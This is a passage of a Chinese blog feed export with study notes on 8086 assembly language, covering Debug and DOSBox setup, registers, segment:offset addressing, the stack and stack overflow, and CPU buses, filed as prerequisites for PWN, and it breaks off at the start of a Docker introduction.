src="/../images/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/2bf3679bd8d446aea6926cf6fcffd97e.png" alt="DOSBox配置"><br> 以后每次打开就能直接运行Debug程序了。</li><li>打开DOSCBox后可以发现窗口无法放大缩小，可以打开“…Option.bat”文件后找到<br> “windowresolution&#x3D;original<br>  output&#x3D;surface”代码，将它改为<br>  “windowresolution&#x3D;你需要的分辨率（如1200x800）<br>  output&#x3D;opengl”就能正常放大程序窗口了。</li></ol><h2 id="2-Debug命令"><a href="#2-Debug命令" class="headerlink" title="2.Debug命令"></a>2.Debug命令</h2><p>可以参照这篇文章进行了解和学习：<br>一般是先用r命令查看当前寄存器内部的值，再用a命令进行编程。<br><a href="https://blog.csdn.net/weixin_43809545/article/details/103640185">汇编语言DEBUG命令详解||汇编命令||DEBUG的常用命令：A,U,R,T,D,E,Q 等等</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三、栈</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%89%E3%80%81%E6%A0%88/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%89%E3%80%81%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="三、-栈"><a href="#三、-栈" class="headerlink" title="三、*栈"></a>三、*栈</h1><h2 id="1-栈的概念"><a href="#1-栈的概念" class="headerlink" title="1. 栈的概念"></a>1. 栈的概念</h2><p>栈是一种具有特殊的访问方式的<strong>存储空间</strong>。它的特殊性就在于，最后进入这个空间的数据，最先出去。</p><h2 id="2-CPU栈机制"><a href="#2-CPU栈机制" class="headerlink" title="2. CPU栈机制"></a>2. CPU栈机制</h2><p>入栈就是将一个新的元素放到栈顶，出栈就是从栈顶取出一个元素。栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出。栈的这种操作规则被称为:LIFO(Last In First Out，后进先出)。<br>从程序化的⻆度来讲，应该有一个标记，这个标记一直指示着栈顶。（SS：SP）</p><ul><li>栈从栈底(高位)开始存入数据，从栈顶(低位)开始复制数据转移出寄存器。</li></ul><h2 id="3-SS和SP"><a href="#3-SS和SP" class="headerlink" title="3. SS和SP"></a>3. SS和SP</h2><p>CPU 如何知道栈顶的位置?显然，也应该有相应的寄存器来存放栈顶的地址，8086CPU中，有两个寄存器，<strong>段寄存器SS和寄存器SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。任意时刻，SS:SP指向栈顶元素。push指令和pop指令执行时，CPU 从SS 和SP 中得到栈顶的地址。</strong></p><blockquote><p>push ax 的执行，由以下两步完成。<br>(1)SP&#x3D;SP-2，SS:SP 指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶;<br>(2)将ax中的内容送入SS:SP 指向的内存单元处，SS:SP此时指向新栈顶。</p></blockquote><blockquote><p>pop ax的执行过程和push ax刚好相反，由以下两步完成。<br>(1)将SS:SP 指向的内存单元处的数据送入ax 中;<br>(2)SP&#x3D;SP+2，SS:SP 指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</p></blockquote><ul><li>push指令先指定空位置，再存入数据</li><li>pop指令先存入数据到寄存器中，再改变SS:SP位置</li><li>pop 操作前的栈顶元素依然存在，但是，它己不在栈中。当再次执行 push 等入栈指令后，SS:SP移至上一个内存单元，并在里面写入新的数据，它将被覆盖。<br>  故磁盘格式化并没有清除数据，只是把“指针”复位了而已，下次写入只是覆盖原有数据，可以复原。</li></ul><h2 id="4-栈溢出"><a href="#4-栈溢出" class="headerlink" title="4. 栈溢出"></a>4. 栈溢出</h2><p>将 10010H~1001FH当作栈空间，该栈空间容量为16字节(8字)，初始状态为空，SS&#x3D;1000H、SP&#x3D;0020H，SS:SP 指向10020H;<br>在执行8次push ax 后，向栈中压入8个字，栈满，SS: SP 指向 10010H;<br>再次执行 push ax: sp&#x3D;sp- 2，SS:SP 指向 1000EH，栈顶超出了栈空间，ax 中的数据送入1000 EH 单元处，将栈空间外的数据覆盖<br>上面描述了执行push、pop 指令时，发生的栈顶超界问题。可以看到，当栈满的时候再使用push 指令入栈，或栈空的时候再使用pop 指令出栈，都将发生栈顶超界问题（栈溢出）。</p><p>栈顶超界是危险的，因为我们既然将一段空间安排为栈，那么在栈空间之外的空间里很可能存放了具有其他用途的数据、代码等，这些数据、代码可能是我们自己程序中的，也可能是别的程序中的(毕竟一个计算机系统中并不是只有我们自己的程序在运行)。但是由于我们在入栈出栈时的不小心，而将这些数据、代码意外地改写，将会引发一连串的错误。</p><blockquote><p><strong>PS：</strong> 如果是故意造成栈溢出的，就可以利用此特性将一些程序中的受保护数据取出（例如用户登录密码等信息），所以栈溢出也是PWN攻击的一种方式。</p></blockquote><p>8086CPU只知道栈项在何处(由SS:SP指示) ，而不知道我们安排的栈空间有多大。这点就好像CPU只知道当前要执行的指令在何处(由CS:IP指示)，而不知道要执行的指令有多少。从这两点上我们可以看出8086CPU 的工作机理，它只考虑当前的情况:当前的栈顶在何处、当前要执行的指令是哪一条。</p><h2 id="5-栈段"><a href="#5-栈段" class="headerlink" title="5. 栈段"></a>5. 栈段</h2><p>我们可以将长度为N( ≤ 64KB) 的一组地址连续、起始地址为16的倍数的内存单元，当作栈空间来用，从而定义了一个栈段。比如，我们将 10010H~1001FH 这段长度为16字节的内存空间当作栈来用，以栈的方式进行访问。这段空间就可以称为一个栈段。</p><p>如果将 10000H~1FFFFH 这段空间当作栈段，SS&#x3D;1000H，栈空间为64KB，栈最底部的字单元地址为1000:FFFE。任意时刻，SS:SP 指向栈顶单元，当栈中只有一个元素的时候，S S&#x3D;1000H，SP&#x3D;FFFEH。栈为空，就相当于栈中唯一的元素出栈，出栈后，SP&#x3D;SP+2.<br>SP原 来为FFFEH，加2后SP&#x3D;0，所以，当栈为空的时候，SS&#x3D;1000H，SP&#x3D;0。</p><p>换一个⻆度看，任意时刻，SS:SP 指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以sS:SP 只能指向栈的最底部单元下面的单元，该单元的地址为栈最底部的字单元的地址+2。栈最底部字单元的地址为1000:FFFE ，所以栈空时，SP&#x3D;0000H.</p><p><strong>段的总结</strong></p><p>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元。这完全是我们自己的安排。<br>不管我们如何安排，CPU将内存中的某段内容当作代码，是因CSIP 指向了那里:CPU将某段内存当作栈，是因为SS;SP 指向了那里。我们一定要清楚，什么是我们的安排，以及如何让CPU 按我们的安排行事。要非常清楚 CPU 的工作机理，才能在控制 CPU 按照我们的安排运行的时候做到游刃有余。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二、寄存器与简单汇编指令</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="二、寄存器与简单汇编指令"><a href="#二、寄存器与简单汇编指令" class="headerlink" title="二、寄存器与简单汇编指令"></a>二、寄存器与简单汇编指令</h1><h2 id="1-简单汇编指令"><a href="#1-简单汇编指令" class="headerlink" title="1.* 简单汇编指令"></a>1.* 简单汇编指令</h2><h3 id="1-1-mov-add和sub指令"><a href="#1-1-mov-add和sub指令" class="headerlink" title="1.1 mov,add和sub指令"></a>1.1 mov,add和sub指令</h3><p><strong>mov指令（传输指令）</strong><br>用C语言可理解为赋值语句，如”mov ax,bx”<br>可理解成”ax&#x3D;bx”。</p><p>使用形式如下：<br>mov  寄存器，数据           比如:  mov ax,8<br>mov  寄存器，寄存器  比如: mov ax,bx<br>mov  寄存器，内存单元    比如: mov ax,[0]<br>mov  内存单元，寄存器    比如: mov [0],ax<br>mov  段寄存器，寄存器    比如: mov ds,ax<br>mov  寄存器，段寄存器    比如: mov ax,ds<br>mov  内存单元，段寄存器 比如:mov [0],ds<br>mov  段寄存器，内存单元 比如:mov ds,[0]</p><p><strong>add和sub指令</strong><br>类似C语言中”+&#x3D;”和”-&#x3D;”这两个运算符号，如”add ax,8”和”sub ax,8”可分别翻译成”ax+&#x3D;8”和”ax-&#x3D;8”这两种运算。</p><p>使用形式可参照上述方式用debug自行实验，不再赘述。</p><h3 id="1-2-jmp指令（转移指令）"><a href="#1-2-jmp指令（转移指令）" class="headerlink" title="1.2 jmp指令（转移指令）"></a>1.2 jmp指令（转移指令）</h3><p>用于修改CS和IP的值来控制CPU执行目标指令。<br>若想同时修改CS、IP的值，可用<br>“<strong>jmp 段地址：偏移地址</strong>”的指令完成。如：<br>jmp 2AE3:3,执行后，CS&#x3D;2AE3H,IP&#x3D;0003H,CPU将从2AE33H处读取指令。<br>jmp 3:0B16,执行后，CS&#x3D;0003H,IP&#x3D;0B16H,CPU将从00B46H处读取指令。<br>若只想修改IP的值，可用“<strong>jmp 某一合法寄存器</strong>”完成。如：<br>jmp ax,在含义上好似“mov IP,ax”意思是用寄存器的值修改IP。</p><h3 id="1-3-push和pop指令（入栈、出栈指令）"><a href="#1-3-push和pop指令（入栈、出栈指令）" class="headerlink" title="1.3 push和pop指令（入栈、出栈指令）"></a>1.3 push和pop指令（入栈、出栈指令）</h3><p>push和pop指令是可以在寄存器和内存（栈空间当然也是内存空间的一部分，它只是一段可以以一种特殊的方式进行访问的内存空间。）之间传送数据的。</p><p>push和pop指令的格式可以是如下形式:</p><blockquote><p>push 寄存器;将一个奇存器中的数据入栈<br>pop 寄存器;出栈，用一个寄存器接收出栈的数据</p></blockquote><p>(PS:用什么类型数据入栈，就用什么类型数据出栈。）</p><p>指令执行时，CPU要知道内存单元的地址，可以在push、pop 指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU 从ds 中取得。</p><ul><li>用栈来暂存以后需要恢复的寄存器中的内容时，出栈的顺序要和入栈的顺序相反，因为最后入栈的寄存器的内容在栈顶，所以在恢复时，要最先出栈。</li><li>将寄存器清零，可以用</li></ul><blockquote><p>mov ax,0<br>sub ax,ax<br>xor ax,ax</p></blockquote><h2 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.  寄存器"></a>2.  寄存器</h2><blockquote><p>一个典型的CPU由运算器、控制器、寄存器(CPU工作原理)等器件构成，这些器件靠内部总线相连。其中寄存器进行信息存储。程序员正是通过改变各种寄存器中的内容来实现对CPU的控制。</p></blockquote><p><strong>每一代CPU都是向下兼容的。</strong></p><blockquote><p>8086CPU 的上一代CPU中的寄存器都是8位的，为了保证兼容，使原来基于上代CPU编写的程序稍加修改就可以运行在8086之上，8086CPU的AX、BX、CX、DX这4个寄存器都可分为两个可独立使用的8位寄存器来用</p><ul><li>AX可分为AH和AL;</li><li>BX 可分为BH 和BL;</li><li>CX 可分为CH 和CL;</li><li>DX可分为DH和DL。</li></ul></blockquote><p>以 AX 为例，8086CPU的16位寄存器分为两个8位寄存器的情况如图2. 3所示。<br><img src="/../images/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/defee50d784d47928bf3401aa152638d.png" alt="图23"></p><h3 id="2-1-字在寄存器中的存储"><a href="#2-1-字在寄存器中的存储" class="headerlink" title="2.1 字在寄存器中的存储"></a>2.1 字在寄存器中的存储</h3><p>8086CPU可以一次性处理以下两种尺寸的数据。</p><ul><li>字节: 记为byte,一个字节由8个bit组成，可以存在8位寄存器中。</li><li>宇:记为word，一个字由两个字节组成，这两个字节分别称为这个字的高位字节和低位字节，一个字可以存在一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高8位寄存器和低8位寄存器中。一个字型数据20000，存在AX寄存器中，在AH中存储它的高8位，在AL中存储了它的低8位。<strong>AH和AL中的数据，既可以看成是一个字型数据的高8位和低8位，这个字型数据的大小是20000:又可以看成是两个独立的字节型数据，它们的大小分别是78和32。</strong></li><li><strong>高位存储高地址，低位存储低地址。</strong></li><li>一个字要用两个地址连续的内存单元来存放</li><li>任何两个地址连续的内存单元，N号单元和 N+1号单元，可以将它们看成两个内存单元，也可看成一个地址为N的字单元中的高位字节单元和低位字节单元。</li></ul><blockquote><p>字节型数据:该地址存放数据，是一个字节。<br>字型数据:整体所指数据，是一个字。</p></blockquote><h3 id="2-2-物理地址与偏移地址"><a href="#2-2-物理地址与偏移地址" class="headerlink" title="2.2 物理地址与偏移地址"></a>2.2 物理地址与偏移地址</h3><blockquote><p><strong>物理地址：</strong> CPU访问内存单元时，要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，我们将这个唯一的地址称为物理地址。</p></blockquote><p>CPU 通过地址总线送入存储器的，必须是一个内存单元的物理地址。在 CPU 向地址总线上发出物理地址之前，必须要在内部先形成这个物理地址。不同的CPU可以有不同的形成物理地址的方式。</p><p><strong>16位CPU（8086CPU）：</strong> </p><ul><li>运算器一次最多可以处理16位的数据</li><li>寄存器的最大宽度为16位</li><li>寄存器和运算器之间的通路为16位</li></ul><blockquote><p>8086CPU有20位地址总线，可以传送20位地址，达到IMB寻址能力。8086CPU又是16位结构，在内部一次性处理、传输、暂时存储的地址为16位。从8086CPU的内部结构来看，如果将地址从内部简单地发出，那么它只能送出16位的地址，表现出的寻址能力只有64KB。8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。<br><img src="/../images/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/cc2d16a08ce84e4da0e2098aa45f83a0.png" alt="图2.6"><br>(1)CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址;<br>(2)段地址和偏移地址通过内部总线送入一个称为地址加法器的部件;<br>(3)地址加法器将两个16位地址合成为一个20位的物理地址;<br>(4)地址加法器通过内部总线将20位物理地址送入输入输出控制电路;<br>(5)输入输出控制电路将20位物理地址送上地址总线;<br>(6)20位物理地址被地址总线传送到存储器。</p></blockquote><p>地址加法器采用<strong>“物理地址&#x3D;段地址x16+偏移地址”</strong>的方法用段地址和偏移地址合成物理地址。</p><p><strong>“段地址x16”的含义：</strong><br>(1)一个数据的二进制形式左移1位，相当于该数据乘以2:<br>(2)一个数据的二进制形式左移N位，相当于该数据乘以2的N次方;<br>(3)地址加法器完成段地址×16的运算就是将以二进制形式存放的段地址左移4位。<br>(4)进一步可知一个X进制的数据左移1位，相当于乘以X。</p><p><strong>“物理地址&#x3D;段地址x16+偏移地址”的本质含义</strong><br>CPU在访问内存时，用一个基础地址(段地址×16)和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址。<br>更一般地说，8086CPU的这种寻址功能是 <strong>“基础地址+偏移地址&#x3D;物理地址”寻址模式</strong>的一种具体实现方案。8086CPU中，段地址×16可看作是基础地址。</p><h3 id="2-3-段"><a href="#2-3-段" class="headerlink" title="2.3 段"></a>2.3 段</h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="(1) 基本概念"></a>(1) 基本概念</h4><p>其实，内存并没有分段，段的划分来自于CPU我们可以用分段的方式来管理内存。(人为规定的)<br>将若干地址连续的内存单元看作一个段，用段地址×16定位段的起始地址(基础地址)，用偏移地址定位段中的内存单元。<br>段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数:偏移地址为16位，16位地址的寻址能力为64KB，所以给定一个段地址，仅通过变化偏移地址来进行寻址,偏移地址16位，变化范围为0- FFFFH，仅用偏移地址来寻址最多可寻64KB个内存单元。</p><p>PS:</p><ul><li>CPU 可以用不同的段地址和偏移地址形成同一个物理地址</li><li>“数据在21F60H内存单元中。”有两种类似的说法:<br>  1.数据存在内存2000:1F60单元中；<br>  2.数据存在内存的2000H段中的1F60H单元中。</li></ul><h4 id="2-段寄存器"><a href="#2-段寄存器" class="headerlink" title="(2) 段寄存器"></a>(2) 段寄存器</h4><p>8086CPU有4个段寄存器:CS、DS、SS、ES。当8086CPU要访问内存时由这4个段寄存器提供内存单元的段地址。</p><h4 id="3-CS和IP"><a href="#3-CS和IP" class="headerlink" title="(3) CS和IP"></a>(3) CS和IP</h4><p>CS和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS 为代码段寄存器，IP 为指令指针寄存器，从名称上我们可以看出它们和指令的关系。<br>在8086PC机中，任意时刻，设CS中的内容为M，IP 中的内容为N，8086CPU将从内存Mx16+N 单元开始，读取一条指令并执行。<br>也可以这样表述:8086机中，任意时刻，CPU将CS:IP 指向的内容当作指令执行。<br><img src="/../images/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/402003a59d1a41e4aa8d5fc577ad5d91.png" alt="图2.10"><br>如图可知，将数据存放到寄存器中需要三个字节，对两个寄存器进行操作需要两个字节。</p><blockquote><p>8086CPU的工作过程可简要描述如下：<br>(1)从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器;<br>(2)IP&#x3D;IP+所读取指令的长度，从而指向下一条指令;<br>(3)执行指令。转到步骤(1)，重复这个过程。</p></blockquote><p><strong>CPU将CS: IP指向的内存单元中的内容看作指令</strong>，因为，在任何时候，CPU将CS、IP 中的内容当作指令的段地址和偏移地址，用它们合成指令的物理地址，到内存中读取指令码，执行。</p><h4 id="4-代码段"><a href="#4-代码段" class="headerlink" title="(4)代码段"></a>(4)代码段</h4><p>可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N(N≤64KB)的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，我们可以认为，这段内存是用来存放代码的，从而定义了 一个代码段。(同样是人为规定的，CPU不知道，它只负责读写指令，执行)</p><h4 id="5-数据段"><a href="#5-数据段" class="headerlink" title="(5)数据段"></a>(5)数据段</h4><p>我们可以将一组长度为 N( ≤ 64KB) 、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段用DS存放数据段的段地址，再根据需要，用相关指令访问数据段中的具体单元。（同上）</p><h4 id="6-DS和-address"><a href="#6-DS和-address" class="headerlink" title="(6) DS和[address]"></a>(6) DS和[address]</h4><p>内存地址由段地址和偏移地址组成。8086CPU 中有DS寄存器，通常用来存放要访问数据的段地址。</p><p><strong>“[…]”表示一个内存单元，“[…]”中的0表示内存单元的偏移地址。</strong><br>“mov al,[0]”指令执行时，8086CPU自动取DS中的数据为内存单元的段地址。<br>10000H 用段地址和偏移地址表示为1000:0，我们先将段地址1000H放入ds，然后用”mov al,[0]”完成传送。mov指令中的[0]说明操作对象是一个内存单元，[0]中的”0”说明这个内存单元的偏移地址是0，它的段地址默认放在DS中，指令执行时，8086CPU会自动从DS中取出。<br><strong>“数据——&gt;通用寄存器——&gt;段寄存器”</strong></p><blockquote><p>mov bx, 1000H<br>mov ds,bx</p></blockquote><p>是给段寄存器赋值的常用操作。</p><p><strong>下面是字传送的详细操作：</strong><br><img src="/../images/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/0b2fc703b22f42c7b3793895ccd482ff.png" alt="在这里插入图片描述"><br><img src="/../images/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/d4d7921bd5074a70ae90b940a3a338c8.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一、基础知识</title>
    <link href="/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/08/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-汇编语言简介"><a href="#1-汇编语言简介" class="headerlink" title="1. 汇编语言简介"></a>1. 汇编语言简介</h2><p><em><strong>从机器语言到汇编语言：</strong></em></p><p><strong>机器语言</strong>：由“0”“1”数字编成，以二进制为基础表示电子器件的高低电平，从而执行机器指令，进行运算。</p><p>明显弊端：难以书写和阅读，复杂难懂。</p><p>于是，程序员写出了编译器来翻译机器语言，汇编语言诞生了。</p><p><strong>汇编语言</strong>：主体为汇编指令。如“mov ax,bx”。操作对象为CPU、寄存器和内存。</p><h2 id="2-CPU基本工作原理"><a href="#2-CPU基本工作原理" class="headerlink" title="2. CPU基本工作原理"></a>2. CPU基本工作原理</h2><blockquote><p>CPU 是计算机的核心部件，它控制整个计算机的运作并进行运算。要想让一个CPU工作，就必须向它提供指令和数据。指令和数据在存储器中存放，也就是我们平时所说的内存。 </p></blockquote><h3 id="2-1-存储单元、指令和数据"><a href="#2-1-存储单元、指令和数据" class="headerlink" title="2.1 存储单元、指令和数据"></a>2.1 存储单元、指令和数据</h3><p><strong>指令和数据：</strong></p><blockquote><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。<strong>CPU 在工作的时候把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同的意义。</strong>（）</p></blockquote><p><strong>存储单元：</strong></p><blockquote><p>存储器被划分成若干个存储单元，每个存储单元从0开始顺序编号。一个存储器能存储128个Byte。</p></blockquote><p>内存计量单位：<br>8bit&#x3D;1B   1KB&#x3D;1024B   1MB&#x3D;1024KB            1GB&#x3D;1024MB   1TB&#x3D;1024GB</p><h3 id="2-2-CPU对存储器的读写"><a href="#2-2-CPU对存储器的读写" class="headerlink" title="2.2 CPU对存储器的读写"></a>2.2 CPU对存储器的读写</h3><blockquote><p>存储器被划分成多个存储单元，存储单元从零开始顺序编号。这些编号可以看作存储单元在存储器中的<strong>地址</strong>。<br>CPU 要从内存中读数据，<strong>首先要指定存储单元的地址</strong><br>CPU 在读写数据时还要指明，它要对哪一个器件进行操作，进行哪种操作，是从中读出数据，还是向里面写入数据。</p></blockquote><p>可见，CPU想进行数据的读写需要和外部器件进行以下三类信息交互：</p><ul><li>存储单元的地址(<strong>地址信息</strong>);</li><li>器件的选择，读或写的命令(<strong>控制信息</strong>); </li><li>读或写的数据(<strong>数据信息</strong>)。</li></ul><h3 id="2-3-三大总线"><a href="#2-3-三大总线" class="headerlink" title="2.3 三大总线"></a>2.3 三大总线</h3><p>CPU通过导线将电信号传到存储器芯片中，从而实现信息的交互。</p><blockquote><p>在计算机中专门有连接 CPU 和其他芯片的导线，通常称为总线。总线从物理上来讲，就是一根根导线的集合。 根据传送信息的不同，总线从逻辑上又分为3类，<strong>地址总线、控制总线和数据总线</strong>。<br>示例：<br><img src="/../images/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6e940afe0acd49fb81f16f36f82aea32-16908218200051.png" alt="传输图例"><br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。<br>(3) 存储器将3号单元中的数据8通过数据线送入CPU。<br>写操作与读操作的步骤相似。如向3号单元写入数据26:<br>(1) CPU通过地址线将地址信息了发出。<br>(2) CPU通过控制线发出内存写命令，选中存储器芯片，并通知它，要向其中写入数据。<br>(3) CPU通过数据线將数据26送入内存的3号单元中。</p></blockquote><p>要让一个计算机或微处理器工作，应向它输入能够驱动它进行工作的电平信息(机器码)。CPU 按收这条机器码后将完成我们上面所述的读写工作。 机器码难于记忆，用汇编指令来表示，情况如下。<br>机器码: 10100001 00000011 00000000<br>对应的汇编指令:MOV AX,[3]<br>含义: 传送3号单元的内容入AX</p><p><strong>由此可见，汇编指令可以方便地直接对CPU进行操作。</strong></p><blockquote><p><strong>地址总线：</strong> CPU是通过地址总线来指定存储器单元的，地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。<br>一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N。这样的CPU可以寻找2ⁿ个内存单元。</p></blockquote><blockquote><p><strong>数据总线：</strong> CPU与内存或其他器件之间的数据传送是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。<br>8根数据总线一次可传送一个8位二进制数据(即一个字节)。16根数据总线一次可传送两个字节。</p></blockquote><blockquote><p><strong>控制总线：</strong> CPU对外部器件的控制是通过控制总线来进行的。在这里控制总线是个总称，控制总线是一些不同控制线的集合。有多少根控制总线，就意味着 CPU 提供了对外部器件的多少种控制。所以，控制总线的宽度决定了CPU 对外部器件的控制能力。</p></blockquote><ul><li>地址总线的宽度决定了CPU 的寻址能力;</li><li>数据总线的宽度决定了CPU 与其他器件进行数据传送时的一次数据传送量: </li><li>控制总线的宽度决定了CPU 对系统中其他器件的控制能力。</li></ul><h2 id="3-内存地址空间"><a href="#3-内存地址空间" class="headerlink" title="3. 内存地址空间"></a>3. 内存地址空间</h2><p>CPU在操控存储器的时候，把它们都当作内存来对待，把它们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器就是我们所说的内存地址空间。</p><p><img src="/../images/%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fa1df46f566545759f03dc1f1d22a794-16908218200063.png" alt="逻辑存储器"><br>在图1. 8中，所有的物理存储器被看作一个由若干存储单元组成的逻辑存储器，每个物理存储器在这个逻辑存储器中占有一个地址段，即一段地址空间。CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据。</p><blockquote><p>内存地址空间的大小受CPU地址总线宽度的限制。8086CPU的地址总线宽度为20，可以传送2²⁰个不同的地址信息(大小从0至2²⁰−1)。即可定位2²⁰个内存单元，则8086PC的内存地址空间大小为1MB。同理，80386CPU的地址总线宽度为32，则内存地址空间最大为4GB。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker简介</title>
    <link href="/2023/07/30/Docker/Docker%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/07/30/Docker/Docker%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h1><h2 id="出现背景"><a href="#出现背景" class="headerlink" title="出现背景"></a>出现背景</h2><p>将环境与项目一起安装打包，避免部署环境的繁杂工作</p><p>及跨平台问题</p><p>Java — apk — 发布（应用商店） — 使用apk — 安装即可用</p><p>java — jar(环境) — 打包项目带上环境（镜像）— (Docker仓库：商店) — 下载发布的镜像 — 直接运行</p><h2 id="开发思想"><a href="#开发思想" class="headerlink" title="开发思想"></a>开发思想</h2><p>集装箱（&#x3D;&#x3D;互相隔离&#x3D;&#x3D;的项目）</p><p>jar — 多个应用（端口冲突）— 交叉并行</p><p>Docker利用隔离机制，将服务器利用到极致</p><h2 id="历史发展"><a href="#历史发展" class="headerlink" title="历史发展"></a>历史发展</h2><p>pass云计算服务+LXC容器技术 — Docker（容器化技术&#x3D;&#x3D;也是虚拟化技术！&#x3D;&#x3D;）</p><p>比虚拟机轻巧，方便，启动速度快，占用内存小（但完整）</p><p>区别：</p><blockquote><p>vm:linux centos 原生镜像互相隔离，需要开启多个虚拟机</p><p>docker : 隔离，镜像（4m+jdk+mysql）小巧，运行镜像就可以，几M，秒级启动 </p></blockquote><h2 id="关于Docker"><a href="#关于Docker" class="headerlink" title="关于Docker"></a>关于Docker</h2><p>&#x3D;&#x3D;基于Go语言开发&#x3D;&#x3D;</p><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p><p>帮助文档：<a href="https://docs.docker.com/">https://docs.docker.com/</a>很详细</p><p>仓库地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a>与git类似</p><h2 id="隔离机制"><a href="#隔离机制" class="headerlink" title="隔离机制"></a>隔离机制</h2><p><img src="/../images/Docker/image-20230726232454445.png" alt="image-20230726232454445"></p><p>​虚拟机（内核+操作环境+APP）</p><blockquote><ul><li>资源占用大</li><li>启动步骤冗余，慢！</li></ul></blockquote><p><img 